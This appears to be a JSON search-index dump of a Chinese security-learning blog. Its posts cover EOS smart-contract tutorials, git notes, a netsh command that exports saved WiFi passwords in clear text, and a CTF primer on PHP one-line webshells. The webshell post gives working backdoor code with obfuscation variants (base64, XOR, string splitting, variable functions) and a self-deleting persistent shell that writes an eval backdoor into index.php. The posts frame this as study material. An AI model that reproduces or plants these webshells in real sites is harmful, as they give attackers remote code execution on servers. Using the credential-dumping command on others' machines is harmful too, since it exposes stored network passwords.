&gt; 0, \"When pigs fly\"); check(quantity.symbol == hodl_symbol, \"These are not the droids you are looking for.\"); balance_table balance(get_self(), hodler.value); auto hodl_it = balance.find(hodl_symbol.raw()); if (hodl_it != balance.end()) balance.modify(hodl_it, get_self(), [&amp;](auto &amp;row) &#123; row.funds += quantity; &#125;); else balance.emplace(get_self(), [&amp;](auto &amp;row) &#123; row.funds = quantity; &#125;); &#125; [[eosio::action]] void party(name hodler) &#123; //Check the authority of hodlder require_auth(hodler); // //Check the current time has pass the the party time check(now() &gt; the_party, \"Hold your horses\"); balance_table balance(get_self(), hodler.value); auto hodl_it = balance.find(hodl_symbol.raw()); // //Make sure the holder is in the table check(hodl_it != balance.end(), \"You're not allowed to party\"); action&#123; permission_level&#123;get_self(), \"active\"_n&#125;, \"eosio.token\"_n, \"transfer\"_n, std::make_tuple(get_self(), hodler, hodl_it-&gt;funds, std::string(\"Party! Your hodl is free.\")) &#125;.send(); balance.erase(hodl_it); &#125;&#125;; 测试创建一个账户 1cleos create account eosio hodl EOS8STYz9TYuEDHS1fErjgaDR1ApTk62eEaBzC7Jhn486paNrgsZC 部署合约到该账户 12eosio-cpp hodl.cpp -o hodl.wasmcleos set contract hodl ./ -p hodl@active 需要eosio.code权限 1cleos set account permission hodl active --add-code 创建一个测试账户 1cleos create account eosio han EOS8STYz9TYuEDHS1fErjgaDR1ApTk62eEaBzC7Jhn486paNrgsZC 将之前发布的SYStoken转移到han账户 1cleos push action eosio.token transfer '[ \"alice\", \"han\", \"100.0000 SYS\", \"Slecht geld verdrijft goed\" ]' -p alice@active 将一些token从han账户转移到hodl合约 1cleos transfer han hodl '0.0001 SYS' 'Hodl!' -p han@active 为了测试提款功能，需要更新the_party变量，将它更新到过去的某个时间点。 1234CONTRACT hodl : public eosio::contract &#123; private: // 9 June 2018 01:00:00 static const uint32_t the_party = 1528549200; 修改the_party值, 然后重新部署运行就行。测试提款： 1cleos push action hodl party &#39;[&quot;han&quot;]&#39; -p han@active","categories":[{"name":"BlockChain","slug":"BlockChain","permalink":"https://ggyggy666.github.io/categories/BlockChain/"}],"tags":[{"name":"区块链安全之EOS学习（三）","slug":"区块链安全之EOS学习（三）","permalink":"https://ggyggy666.github.io/tags/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8%E4%B9%8BEOS%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%89%EF%BC%89/"}],"keywords":[{"name":"BlockChain","slug":"BlockChain","permalink":"https://ggyggy666.github.io/categories/BlockChain/"}]},{"title":"区块链安全之EOS学习（二）","slug":"区块链安全之EOS学习（二）","date":"2021-03-17T07:32:12.000Z","updated":"2021-03-17T14:33:28.458Z","comments":true,"path":"2021/03/17/区块链安全之EOS学习（二）/","link":"","permalink":"https://ggyggy666.github.io/2021/03/17/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8%E4%B9%8BEOS%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/","excerpt":"进入智能合约部分。","text":"进入智能合约部分。 Hello World首先创建一个HelloWorld智能合约，然后编译，部署到区块链上运行。 1234cd &#x2F;xxx&#x2F;contracts &#x2F;&#x2F;先进入到之前创建的contracts目录mkdir hello &#x2F;&#x2F;创建hello目录cd hellovim hello.cpp 编写智能合约创建并打开hello.cpp后，就可以输入智能合约了。由于使用的是C++11标准写的，可能看起来不是太能懂。 1234567891011121314#include &lt;eosio/eosio.hpp&gt; //导入头文件using namespace eosio; //使用eosio命名空间，之后可直接使用print#添加公共访问说明符class [[eosio::contract]] hello : public contract &#123; public: using contract::contract; //使用说明 [[eosio::action]] //为了给hi函数添加action属性，否则ABI生成器无法产生可靠输出。 void hi( name user ) &#123; print( \"Hello, \", user); //这个print是eosio定义的函数 &#125;&#125;; 编译/部署1eosio-cpp hello.cpp -o hello.wasm 将cpp编译为wasm文件。 部署合约时需要部署到一个账户上，使其成为合约的接口。因此先创建一个hello账户： 1cleos create account eosio hello EOS8STYz9TYuEDHS1fErjgaDR1ApTk62eEaBzC7Jhn486paNrgsZC -p eosio@active 指定合约所在目录的绝对路径，将合约部署到区块链 1cleos set contract hello &#x2F;home&#x2F;ggy&#x2F;桌面&#x2F;blockchain&#x2F;contracts&#x2F;hello -p hello@active 与合约交互1cleos push action hello hi &#39;[&quot;bob&quot;]&#39; -p bob@active 使用push将输入传给合约hello的hi函数执行，即’[“bob”]’就是传进去的参数，后面的bob@active是发起这个动作的账户。 1cleos push action hello hi &#39;[&quot;bob&quot;]&#39; -p alice@active alice传bob值进去。这是因为合约没有绑定当前执行这个合约的账户与传进来的user值一致，导致任何账户都可以向任何用户say hello。因此必须要将执行合约的用户与hi中的user相同。在print函数之前加上一个验证： 1require_auth(user); 修改了合约，需要重新编译和部署： 12eosio-cpp -abigen -o hello.wasm hello.cppcleos set contract hello &#x2F;home&#x2F;ggy&#x2F;桌面&#x2F;blockchain&#x2F;contracts&#x2F;hello -p hello@active 再次尝试使用alice账户传bob，报错了。使用alice账户传alice，成功。 部署tokentoken就是用来交易的货币，EOS中称为：eosio.token。 获得合约123cd xxx&#x2F;contractsgit clone https:&#x2F;&#x2F;github.com&#x2F;EOSIO&#x2F;eosio.contracts --branch v1.7.0 --single-branchcd eosio.contracts&#x2F;contracts&#x2F;eosio.token github下得太慢，可以先转到gitee下。 部署合约首先得创建token账户,解锁钱包后 1cleos create account eosio eosio.token EOS6MRyAjQq8ud7hVNYcfnVPJqcVpscN5So8BhtHuGYqET5GDW5CV 编制合约 1eosio-cpp -I include -o eosio.token.wasm src&#x2F;eosio.token.cpp --abigen 部署token合约 1cleos set contract eosio.token &#x2F;home&#x2F;ggy&#x2F;桌面&#x2F;blockchain&#x2F;contracts&#x2F;eosio.contracts&#x2F;contracts&#x2F;eosio.token --abi eosio.token.abi -p eosio.token@active 创建令牌创建令牌，需要确定发行者的账户比如Alice，需要设置资产数量，比如1.000SYS，浮点数代表最大供给量，大写字母SYS表示资产。 1cleos push action eosio.token create &#39;[ &quot;alice&quot;, &quot;1000000000.0000 SYS&quot;]&#39; -p eosio.token@active -p 后指定的账户表面已经过这个token账户授权。还有另一种方法: 1cleos push action eosio.token create '&#123;\"issuer\":\"alice\", \"maximum_supply\":\"1000000000.0000 SYS\"&#125;' -p eosio.token@active 发行令牌上面已经指定Alice是发行人了，只能它发行。 1cleos push action eosio.token issue &#39;[&quot;alice&quot;, &quot;100.0000 SYS&quot;, &quot;memo&quot;]&#39; -p alice@active 这个要求通知资金的发送者和接收者，可以使用-d -j指示“不要广播”和”将事务返回json”。 1cleos push action eosio.token issue &#39;[&quot;alice&quot;, &quot;100.0000 SYS&quot;, &quot;memo&quot;]&#39; -p alice@active -d -j 转移令牌一个账户向另一个账户转钱 1cleos push action eosio.token transfer &#39;[&quot;alice&quot;, &quot;bob&quot;, &quot;25.0000 SYS&quot;, &quot;m&quot;]&#39; -p alice@active alice向bob转了25 检查bob是否接收到了 1cleos get currency balance eosio.token bob SYS 查看Alice的余额 1cleos get currency balance eosio.token alice SYS ABI文件看指导书吧 https://developers.eos.io/welcome/latest/smart-contract-guides/understanding-ABI-files 数据持久性持久保存智能合约的使用，不被无关的业务逻辑分散。实质就是配置表，实例化表，创建新记录，修改记录和删除记录。 创建地址簿智能合约1cd &#x2F;home&#x2F;ggy&#x2F;桌面&#x2F;blockchain&#x2F;contracts 切换回contracts目录下 123mkdir addressbookcd addressbookvim addressbook.cpp 新建文件打开后 123456789#include&lt;eosio&#x2F;eosio.hpp&gt;using namespace eosio;class [[eosio::contract(&quot;addressbook&quot;)]] addressbook : public eosio::contract&#123; public: private:&#125; 以上是按照之前那样的C++11标准编写的框架。下面来完善它。 为地址簿创建数据结构这是一个通讯录，对象肯定是人，因此需要创建一个人的结构。 12345678910struct person&#123; name key; &#x2F;&#x2F;用户的key,name类型的，唯一。 std::string first_name; std::string last_name; std::string street; std::string city; std::string state; uint64_t primary_key() const &#123;return key.value&#125;; &#x2F;&#x2F;为了让之后的multi_index可以根据key得到value&#125; 配置多索引表使用前面的struct配置表。该表的eosio::multi_index需要命名。 1using address_index &#x3D; eosio::multi_index&lt;&quot;people&quot;_n, person&gt; 通过multi_index的配置，有了一个people的表。 使用_n定义eosio::name类型，使用该类型命名表为people。 传递person给之前的person结构。 声明了此表的类型，之后用来实例化这个表。 构造函数合约第一个公共方法应该是构造函数。 1addressbook(name receiver, name code, datastream&lt;const char*&gt; ds):contract(receiver, code, ds)&#123;&#125; code是将合约部署到区块链的账户。 向表中添加记录先前定义了多索引表的primary_key，是为了强制每个账户只能存储一个记录。设计规则： 能修改地址簿的唯一账户只能是用户自身。 表的primary_key唯一。 可以创建和修改表的记录。 而person结构中，name类似的key也是唯一的，因此它可成为primary_key（uint64_t 整数）。而条件一的满足只需要require即可。 12345678910void upsert( name user, std::string first_name, std::string last_name, std::string street, std::string city, std::string state)&#123; require_auth(user);&#125; 实例化表可以看到要实例化表，需要两个参数： code：由于修改，删除记录都是只能自身合约账户来操作，因此参数值应该是：get_self(), 即合约名字。 scope: 直接使用部署该合约的账户，即：get_first_receiver()。 因此，增加代码如下: 1address_index addresses(get_self(), get_first_receiver().value); 之后查询迭代器，将其设置为变量。因为它后面会需要被多次使用。 1auto iterator &#x3D; addresses.find(user.value) 它的用处是用来查询用户 创建/修改表上面的addresses.find查找某个用户，如果用户不存在，会返回null, 赋值给iterator。而addresses.end()方法就是”null”的别名。因此可以判断它们是否相等来判断某个用户是否存在。 12345678910111213141516171819202122#如果用户不存在，就创建一条记录。if(iterator &#x3D;&#x3D; addresses.end())&#123; addresses.emplace(user, [&amp;](auto&amp; row)&#123; row.key &#x3D; user; row.first_name &#x3D; first_name; row.last_name &#x3D; last_name; row.street &#x3D; street; row.city &#x3D; city; row.state &#x3D; state; &#125;);&#125;else&#123; #如果用户存在，就修改其记录 addresses.modify(iterator, user, [&amp;]( auto&amp; row ) &#123;&#x2F;&#x2F;找到的用户iterator, 为添加这条记录付款的当前用户，lamba函数引用修改 row.key &#x3D; user; row.first_name &#x3D; first_name; row.last_name &#x3D; last_name; row.street &#x3D; street; row.city &#x3D; city; row.state &#x3D; state; &#125;); &#125;&#125; 从表中删除记录前面部分一致 1234567void erase(name user)&#123; require_auth(user); address_index addresses(get_self(), get_first_receiver().value); auto iterator &#x3D; addresses.find(user.value); check(iterator !&#x3D; addresses.end, &quot;Record does not exist&quot;);&#x2F;&#x2F;检查记录是否存在 addresses.erase(iterator);&#x2F;&#x2F;存在则删除&#125; 为ABI准备要使ABI生成器正常工作，需要添加一写action生命。 在upsert和erase函数上方，添加： 1[[eosio::action]] 对person数据结构： 1struct person&#123;...&#125; --&gt; struct [[eosio::table]] person&#123;...&#125; 有了这个声明才会将一些必要的描述添加到ABI文件中。 最终的合约12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061#include &lt;eosio&#x2F;eosio.hpp&gt;using namespace eosio;class [[eosio::contract(&quot;addressbook&quot;)]] addressbook : public eosio::contract &#123;public: addressbook(name receiver, name code, datastream&lt;const char*&gt; ds): contract(receiver, code, ds) &#123;&#125; [[eosio::action]] void upsert(name user, std::string first_name, std::string last_name, std::string street, std::string city, std::string state) &#123; require_auth( user ); address_index addresses( get_self(), get_first_receiver().value ); auto iterator &#x3D; addresses.find(user.value); if( iterator &#x3D;&#x3D; addresses.end() ) &#123; addresses.emplace(user, [&amp;]( auto&amp; row ) &#123; row.key &#x3D; user; row.first_name &#x3D; first_name; row.last_name &#x3D; last_name; row.street &#x3D; street; row.city &#x3D; city; row.state &#x3D; state; &#125;); &#125; else &#123; addresses.modify(iterator, user, [&amp;]( auto&amp; row ) &#123; row.key &#x3D; user; row.first_name &#x3D; first_name; row.last_name &#x3D; last_name; row.street &#x3D; street; row.city &#x3D; city; row.state &#x3D; state; &#125;); &#125; &#125; [[eosio::action]] void erase(name user) &#123; require_auth(user); address_index addresses( get_self(), get_first_receiver().value); auto iterator &#x3D; addresses.find(user.value); check(iterator !&#x3D; addresses.end(), &quot;Record does not exist&quot;); addresses.erase(iterator); &#125;private: struct [[eosio::table]] person &#123; name key; std::string first_name; std::string last_name; std::string street; std::string city; std::string state; uint64_t primary_key() const &#123; return key.value; &#125; &#125;; using address_index &#x3D; eosio::multi_index&lt;&quot;people&quot;_n, person&gt;;&#125;; 准备Ricardian合同没有Ricardian合同，编译使会产生警告，然后默认生成一些条目。 首先新建文件（合约名称需与智能合约的名称相同） 1touch addressbook.contracts.md 然后往文件添加定义 12345678910111213&lt;h1 class&#x3D;&quot;contract&quot;&gt;upsert&lt;&#x2F;h1&gt;---spec-version: 0.0.2title: Upsertsummary: This action will either insert or update an entry in the address book. If an entry exists with the same name as the specified user parameter, the record is updated with the first_name, last_name, street, city, and state parameters. If a record does not exist, a new record is created. The data is stored in the multi index table. The ram costs are paid by the smart contract.icon:&lt;h1 class&#x3D;&quot;contract&quot;&gt;erase&lt;&#x2F;h1&gt;---spec-version: 0.0.2title: Erasesummary: This action will remove an entry from the address book if an entry in the multi index table exists with the specified name.icon: 准备Ricardian子句1touch addressbook.clauses.md 添加 123456789101112131415161718192021222324252627282930313233343536&lt;h1 class&#x3D;&quot;clause&quot;&gt;Data Storage&lt;&#x2F;h1&gt;---spec-version: 0.0.1title: General Data Storagesummary: This smart contract will store data added by the user. The user consents to the storage of this data by signing the transaction.icon:&lt;h1 class&#x3D;&quot;clause&quot;&gt;Data Usage&lt;&#x2F;h1&gt;---spec-version: 0.0.1title: General Data Usesummary: This smart contract will store user data. The smart contract will not use the stored data for any purpose outside store and delete.icon:&lt;h1 class&#x3D;&quot;clause&quot;&gt;Data Ownership&lt;&#x2F;h1&gt;---spec-version: 0.0.1title: Data Ownershipsummary: The user of this smart contract verifies that the data is owned by the smart contract, and that the smart contract can use the data in accordance to the terms defined in the Ricardian Contract.icon:&lt;h1 class&#x3D;&quot;clause&quot;&gt;Data Distirbution&lt;&#x2F;h1&gt;---spec-version: 0.0.1title: Data Distirbutionsummary: The smart contract promises to not actively share or distribute the address data. The user of the smart contract understands that data stored in a multi index table is not private data and can be accessed by any user of the blockchain. icon:&lt;h1 class&#x3D;&quot;clause&quot;&gt;Data Future&lt;&#x2F;h1&gt;---spec-version: 0.0.1title: Data Futuresummary: The smart contract promises to only use the data in accordance of the terms defined in the Ricardian Contract, now and at all future dates.icon: 编译/部署合约1eosio-cpp addressbook.cpp -o addressbook.wasm 编译之后，进行部署。 1cleos create account eosio addressbook EOS8STYz9TYuEDHS1fErjgaDR1ApTk62eEaBzC7Jhn486paNrgsZC -p eosio@active 创建一个账户。 1cleos set contract addressbook &#x2F;home&#x2F;ggy&#x2F;桌面&#x2F;blockchain&#x2F;contracts&#x2F;addressbook -p addressbook@active 部署合约 1cleos push action addressbook upsert &#39;[&quot;alice&quot;, &quot;alice&quot;, &quot;liddell&quot;, &quot;123 drink me way&quot;, &quot;wonderland&quot;, &quot;amsterdam&quot;]&#39; -p alice@active 测试合约 1cleos push action addressbook upsert &#39;[&quot;bob&quot;, &quot;bob&quot;, &quot;is a loser&quot;, &quot;doesnt exist&quot;, &quot;somewhere&quot;, &quot;someplace&quot;]&#39; -p alice@active 检查alice是否无法为bob添加记录。报错了，确实阻止了。 1cleos get table addressbook addressbook people --lower alice --limit 1 检查alice的记录。 1cleos push action addressbook erase &#39;[&quot;alice&quot;]&#39; -p alice@active 测试alice是否可以删除记录。 1cleos get table addressbook addressbook people --lower alice --limit 1 检查记录是否已经删除。","categories":[{"name":"BlockChain","slug":"BlockChain","permalink":"https://ggyggy666.github.io/categories/BlockChain/"}],"tags":[{"name":"区块链安全之EOS学习（二）","slug":"区块链安全之EOS学习（二）","permalink":"https://ggyggy666.github.io/tags/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8%E4%B9%8BEOS%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/"}],"keywords":[{"name":"BlockChain","slug":"BlockChain","permalink":"https://ggyggy666.github.io/categories/BlockChain/"}]},{"title":"区块链安全之EOS学习（一）","slug":"区块链安全之EOS学习（一）","date":"2021-03-17T07:10:04.000Z","updated":"2021-03-17T13:35:57.141Z","comments":true,"path":"2021/03/17/区块链安全之EOS学习（一）/","link":"","permalink":"https://ggyggy666.github.io/2021/03/17/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8%E4%B9%8BEOS%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/","excerpt":"入门指南：https://developers.eos.io/welcome/latest/getting-started-guide/local-development-environment/system_requirements","text":"入门指南：https://developers.eos.io/welcome/latest/getting-started-guide/local-development-environment/system_requirements 环境安装下载EOSIOUbuntu18.04： 12wget https://github.com/EOSIO/eos/releases/download/v2.0.9/eosio_2.0.9-1-ubuntu-18.04_amd64.debsudo apt install ./eosio_2.0.9-1-ubuntu-18.04_amd64.deb 设置目录12mkdir contractscd contracts 安装CDT123wget https://github.com/eosio/eosio.cdt/releases/download/v1.7.0/eosio.cdt_1.7.0-1-ubuntu-18.04_amd64.debsudo apt install ./eosio.cdt_1.7.0-1-ubuntu-18.04_amd64.deb 创建钱包1cleos wallet create --to-console 创建一个default账户，返回一个密码，要好好保存它。 1cleos wallet open 打开钱包 1cleos wallet list 返回钱包列表。这个时候default账户是锁了的。 1cleos wallet unlock 解锁钱包，需要用到上面创建时候的密码。再查看钱包列表，会发现default后面多了个*，表明钱包已解锁。 将密钥导入钱包1cleos wallet create_key 生成一个私钥和公钥，返回的是公钥，这个公钥也要好好保存。 1cleos wallet import 导入私钥，这时候会提醒输入开发密钥，只需要输入下面的开发密钥(eosio提供的): 15KQwrPbwdL6PhXujxW37FSSQZ1JiwsST4cqQzDeyXtP79zkvFD3 部署区块链钱包和智能合约创建好后，开始部署到区块链进行测试。 keosd1keosd &amp; 启动keosd。看到一些输出，然后按回车即可。如果遇到错误信息，很可能是另一个keosd在运行，需要使用： 12pkill keosd &#x2F;&#x2F;杀死所有keosd实例keosd &amp; &#x2F;&#x2F;重新运行 nodeos123456789101112nodeos -e -p eosio \\--plugin eosio::producer_plugin \\--plugin eosio::producer_api_plugin \\--plugin eosio::chain_api_plugin \\--plugin eosio::http_plugin \\--plugin eosio::history_plugin \\--plugin eosio::history_api_plugin \\--filter-on&#x3D;&quot;*&quot; \\--access-control-allow-origin&#x3D;&#39;*&#39; \\--contracts-console \\--http-validate-host&#x3D;false \\--verbose-http-errors &gt;&gt; nodeos.log 2&gt;&amp;1 &amp; 启动nodeos, 这个命令会加载所有插件，设置服务器地址，启用CORS并添加一些合同调试和日志记录。当然启动后很可能也是有另一个在运行，同意得先kill掉再重启。 1tail -f nodeos.log 看到一堆输出，这是检查nodeos是否正在生产块，Ctrl+C即可停止。 查看钱包1cleos wallet list 查看钱包列表，这时会看到一个空钱包列表。 浏览器检查nodeos端点1curl http:&#x2F;&#x2F;localhost:8888&#x2F;v1&#x2F;chain&#x2F;get_info 即可查看到区块信息。 创建开发账户可创建多个账户，注意需要对账户分配权限。 创建测试账户需要先确保钱包解锁了。 1cleos create account eosio bob 公钥 这个公钥是之前保存的钱包的公钥。 1cleos get account bob 获取bob账户的相关信息，比如它关联的公钥。","categories":[{"name":"BlockChain","slug":"BlockChain","permalink":"https://ggyggy666.github.io/categories/BlockChain/"}],"tags":[{"name":"区块链安全之EOS学习（一）","slug":"区块链安全之EOS学习（一）","permalink":"https://ggyggy666.github.io/tags/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8%E4%B9%8BEOS%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/"}],"keywords":[{"name":"BlockChain","slug":"BlockChain","permalink":"https://ggyggy666.github.io/categories/BlockChain/"}]},{"title":"git学习","slug":"git学习","date":"2021-03-08T12:06:45.000Z","updated":"2021-03-17T13:36:57.700Z","comments":true,"path":"2021/03/08/git学习/","link":"","permalink":"https://ggyggy666.github.io/2021/03/08/git%E5%AD%A6%E4%B9%A0/","excerpt":"之前学习过git操作，但是又忘了，特此记录。","text":"之前学习过git操作，但是又忘了，特此记录。 初始使用123456echo &quot;dd&quot; &gt;&gt; README.md #在工作区新建一个文件git init #git初始化git add README.md #将工作区文件添加到暂存区git commit -m &quot;first commit&quot; #将暂存区的文件提交到本地仓库，并添加描述“first commit”git remote add origin &#39;git的地址&#39; #需要在GitHub新建一个仓库，然后复制那个仓库地址。origin是这个地址的描述。git push -u origin master #将origin添加到master分支。 简单使用git remote这个只需要第一次连接时才用。之后就不用了。如果是添加或者修改文件，不用分支的话，只需要: 123git add xxxgit commit -m &quot;xx&quot;git push 通过建立分支，可以方便获取每次修改的文件内容，即： 123456789git checkout -b content #创建并切换到content分支这个时候去修改文件内容，完之后。git status #查看文件的状态git add xxx #将工作区文件添加到暂存区git commit -m &quot;xxx&quot; #提交到本地仓库，这个时候可以描述是&quot;second commit&quot;git checkout master #切换回master分支git merge content #将content分支合并到master分支。这样在content分区修改了的内容就会被合并到master分支git log #查看文件日志git push #推送到GitHub 其它操作12345git clone 网址git mv [原文件] [新文件] #修改文件名git rm [文件名] #删除文件git pull [远程主机别名]&lt;远程分支名称&gt;:[本地分支名称] #下载代码并快速合并git push [远程主机别名][本地分支名称]:&lt;远程分支名称&gt; 问题遇到一个问题，git无法连接上GitHub了，搞了一下午，最后终于解决了。使用SSH连接。 1231. git remote set-url origin git@github.com:xxx（仓库ssh地址） 2.https:&#x2F;&#x2F;blog.csdn.net&#x2F;YanceChen2013&#x2F;article&#x2F;details&#x2F;822183563.第二步会遇到问题，看下面链接：https:&#x2F;&#x2F;blog.csdn.net&#x2F;argleary&#x2F;article&#x2F;details&#x2F;100638560","categories":[{"name":"web安全","slug":"web安全","permalink":"https://ggyggy666.github.io/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"git学习","slug":"git学习","permalink":"https://ggyggy666.github.io/tags/git%E5%AD%A6%E4%B9%A0/"}],"keywords":[{"name":"web安全","slug":"web安全","permalink":"https://ggyggy666.github.io/categories/web%E5%AE%89%E5%85%A8/"}]},{"title":"获取电脑连接的WiFi密码","slug":"获取电脑连接的WiFi密码","date":"2021-03-08T12:05:45.000Z","updated":"2021-03-13T02:13:46.449Z","comments":true,"path":"2021/03/08/获取电脑连接的WiFi密码/","link":"","permalink":"https://ggyggy666.github.io/2021/03/08/%E8%8E%B7%E5%8F%96%E7%94%B5%E8%84%91%E8%BF%9E%E6%8E%A5%E7%9A%84WiFi%E5%AF%86%E7%A0%81/","excerpt":"","text":"今天在B站看到一个视频，发现能查看电脑连接过的WIFI密码，于是实战一下。 操作 win+R，输入cmd，进入命令行 粘贴：netsh wlan export profile key=clear &amp;&amp; type *.xml &gt; 666.txt, 回车。 打开C盘-&gt;用户-&gt;当前用户名的文件夹下，拉到后面即可看到xml文件。 打开即可看到WiFi用户名和密码。 但是有的WiFi加密了就没办法了。 123456789101112131415161718192021222324252627Netsh WLAN show profiles --- 显示了每个无线适配器在计算机上存储的所有配置文件Netsh WLAN show profiles interface&#x3D;&quot;WLAN&quot; ---显示特定无线适配器的配置文件列表Netsh WLAN show drivers ---获取有关计算机的无线适配器的驱动程序信息Netsh WLAN show wirelesscapabilities ---查看所有受支持的无线适配器功能Netsh WLAN show interfaces --- 查看特定的无线适配器信息Netsh WLAN show profile name&#x3D;&quot;Profile_Name&quot; key&#x3D;clear ---查看密码 如果您丢失了密码并且忘记了将另一台设备连接到特定Wi-Fi接入点的网络安全密钥，则可以使用以下命令查看网络安全密钥Netsh WLAN set profileparameter name&#x3D;&quot;Profile_Name&quot; connectionmode&#x3D;manual --- 防止计算机自动连接到其他网络，自动停止连接超出的网络Netsh WLAN set profileparameter name&#x3D;&quot; Profile_Name&quot; connectionmode&#x3D;auto ---Windows 10将始终优先选择您选择自动连接的那些网络。如果要在优先级列表中向上移动网络Netsh WLAN delete profile name&#x3D;&quot;Profile_Name&quot; --- 删除密码和配置Netsh WLAN export profile key&#x3D;clear folder&#x3D;&quot;Folder_Path&quot; ---导出所有无线网络配置文件Netsh WLAN export profile name&#x3D;&quot;Profile_Name&quot; key&#x3D;clear folder&#x3D;&quot;Folder_Path&quot; ---导入特定配置Netsh WLAN add profile filename&#x3D;&quot;File_Path.XML&quot; ---导入配置Netsh WLAN add profile filename&#x3D;&quot;Path_With_Filename.xml&quot; Interface&#x3D;&quot;Wireless Network Connection&quot; user&#x3D;current --- 将配置文件导入到特定的无线接口而仅导入到当前用户Netsh WLAN show WLANreport --- 创建无线报告 对与接入点的无线连接进行故障排除","categories":[{"name":"无线安全","slug":"无线安全","permalink":"https://ggyggy666.github.io/categories/%E6%97%A0%E7%BA%BF%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"WiFi","slug":"WiFi","permalink":"https://ggyggy666.github.io/tags/WiFi/"}],"keywords":[{"name":"无线安全","slug":"无线安全","permalink":"https://ggyggy666.github.io/categories/%E6%97%A0%E7%BA%BF%E5%AE%89%E5%85%A8/"}]},{"title":"涅普CTF入门-一句话木马","slug":"涅普CTF入门-一句话木马","date":"2021-02-20T10:26:03.000Z","updated":"2021-03-17T13:36:27.332Z","comments":true,"path":"2021/02/20/涅普CTF入门-一句话木马/","link":"","permalink":"https://ggyggy666.github.io/2021/02/20/%E6%B6%85%E6%99%AECTF%E5%85%A5%E9%97%A8-%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/","excerpt":"今天学习web的一句话木马。","text":"今天学习web的一句话木马。 条件 木马能上传到服务器。 上传后能保留并被解析执行。 知道上传后的路径。 eval和assertassert在PHP7.1之后被废弃了。eval不能被可变函数调用，比如： 1234&lt;?php $a &#x3D; &quot;eval&quot;; @$a(@$_GET[&#39;x&#39;]);?&gt; 有@和无@的区别有@不会显示报错，没有就会显示。比如assert，PHP&gt;7.1之后就废弃了，继续使用会报错，如果用了@ 页面一片空白。没有使用@, 直接报错。 一句话木马及变种原型12&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt; &#x2F;&#x2F;用蚁剑连，密码是cmd&lt;?php @eval(&quot;phpinfo();&quot;);?&gt; &#x2F;&#x2F;PHP探针 需要注意的是，使用蚁剑连的话需要使用$_POST, 使用$_GET是不行的。$_REQUEST也是可以的。 使用JS代码1&lt;script language&#x3D;&quot;php&quot;&gt;@eval($_POST[&#39;cmd&#39;])&lt;&#x2F;script&gt; 这个在PHPStudy的环境没有解析成功? 拆分拼接12345&lt;?php $arr &#x3D; explode(&quot;,&quot;,&quot;a,s,d,f,s,d,e,k,r,t&quot;); $payload &#x3D; $arr[0].$arr[1].$arr[4].$arr[6].$arr[8].$arr[9]; @$payload(@$_GET[&#39;cmd&#39;]);?&gt; PHP版本需要小于7.1才能拼接assert, 而拼接eval是不行的。 编码1234&lt;?php $a &#x3D; base64_decode(&quot;YXNzZXJ0&quot;); $a($_POST[&#39;cmd&#39;]);?&gt; 同样PHP&lt;7.1。 随机异或1234567891011&lt;?php &#x2F;&#x2F;也可以用十六进制进行进一步加密,例如 &#x2F;&#x2F;$r&#x3D;&quot;x4d&quot;^&quot;x3f&quot;; $a&#x3D;&quot;Y&quot;^&quot;8&quot;;&#x2F;&#x2F;a $b&#x3D;&quot;T&quot;^&quot;&#39;&quot;;&#x2F;&#x2F;s $c&#x3D;&quot;*&quot;^&quot;O&quot;;&#x2F;&#x2F;e $d&#x3D;&quot;M&quot;^&quot;?&quot;;&#x2F;&#x2F;r $e&#x3D;&quot;-&quot;^&quot;Y&quot;;&#x2F;&#x2F;t $payload&#x3D;$a.$b.$b.$c.$d.$e;&#x2F;&#x2F;拼接成assert @$payload(@$_POST[&#39;x&#39;]);?&gt; 可变变量123456&lt;?php $a&#x3D;&#39;assert&#39;; $b&#x3D;&#39;a&#39;; &#x2F;&#x2F;$$b&#x3D;$a&#x3D;&#39;assert&#39; $$b($_POST[&#39;x&#39;]); &#x2F;&#x2F;assert($_POST[&#39;x&#39;])?&gt; 可变函数1234&lt;?php@$_REQUEST[&#39;e&#39;](@$_REQUEST[&#39;x&#39;]);&#x2F;&#x2F;传入e&#x3D;assert&amp;x&#x3D;command?&gt; 使用回调函数使用到：call_user_func($callback, $parameter)，$callback是回调函数名称，parameter是参数。使用方法： 1234&lt;?php @call_user_func($_GET[&#39;id&#39;],$_GET[&#39;a&#39;]); &#x2F;&#x2F;传入id&#x3D;eval&amp;a&#x3D;command?&gt; 报错了？？ 不死马12345678910&lt;?php ignore_user_abort(true);set_time_limit(0);unlink(__FILE__);$file &#x3D; &#39;.&#x2F;index.php&#39;;$code &#x3D; &#39;&lt;?php if($_GET[&quot;pass&quot;]&#x3D;&#x3D;&quot;ggy&quot;)&#123;@eval($_GET[&quot;cmd&quot;]);&#125; ?&gt;&#39;;&#x2F;&#x2F;pass&#x3D;nepnep 用法：pass&#x3D;nepnep&amp;cmd&#x3D;command file_put_contents($file,$code); usleep(5000);?&gt; ignore_user_abort(true): 设置成true，断开连接仍然执行一句话。 set_time_limit(0): 0表示没有限制。 unlink(__FILE__): 删除文件自身。 usleep(): 延迟执行当前脚本。 崩了。。 之后访问:xxx/index.php?pass=ggy&amp;cmd=phpinfo();即可。 利用函数和类123456&lt;?php function ggy($a)&#123; assert($a); &#125; @ggy($_POST[&#39;cmd&#39;]);?&gt; 12345678910&lt;?php class ggy&#123; public $a&#x3D;&#39;&#39;; function __destruct()&#123; assert(&quot;this-&gt;$a&quot;); &#125; &#125; $b&#x3D;new ggy(); $b-&gt;a&#x3D;$_POST[&#39;cmd&#39;];?&gt; 文件写入1234567891011&lt;?php if(isset($_GET[&#39;filename&#39;])) &#123; $d&#x3D;&#39;data&#39;; 